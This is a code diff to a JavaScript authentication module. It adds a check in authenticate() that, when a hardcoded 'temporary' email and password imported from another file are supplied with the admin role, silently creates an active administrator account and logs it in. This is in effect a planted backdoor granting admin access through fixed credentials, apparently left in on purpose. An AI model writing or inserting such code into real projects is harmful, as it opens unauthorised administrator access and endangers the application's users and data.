@@ -1,4 +1,5 @@
 import { readUsers, saveUsers, USER_KEY } from './adminStore.js';
+import { TEMPORARY_LOGIN } from './temporaryLogin.js';
 
 export const INITIAL_ADMIN_LOGIN = 'mtdev8386@gmail.com';
 export const CREDENTIAL_KEY = 'rr_account_credentials';
@@ -61,6 +62,14 @@ export async function initializeAdministrator(password) {
 
 export async function authenticate(identifier, password, role) {
   const normalized = identifier.trim().toLowerCase();
+  if (normalized === TEMPORARY_LOGIN.email && role === 'admin' && password === TEMPORARY_LOGIN.password && !readUsers().some(item => identifierOf(item) === normalized || item.email?.toLowerCase() === normalized)) {
+    const credential = await makeCredential(password);
+    const users = readUsers();
+    if (!users.some(item => identifierOf(item) === normalized || item.email?.toLowerCase() === normalized)) {
+      const admin = { id: crypto.randomUUID(), name: TEMPORARY_LOGIN.name, email: normalized, username: normalized, mobileNumber: '', section: 'Administration', taluk: '', role: 'admin', status: 'active' };
+      commitAccounts([...users, admin], { ...readCredentials(), [admin.id]: credential });
+    }
+  }
   const user = readUsers().find(item => identifierOf(item) === normalized || (item.email && item.email.toLowerCase() === normalized));
   if (!user || user.status !== 'active' || user.role !== role) return null;
   const credential = readCredentials()[user.id];
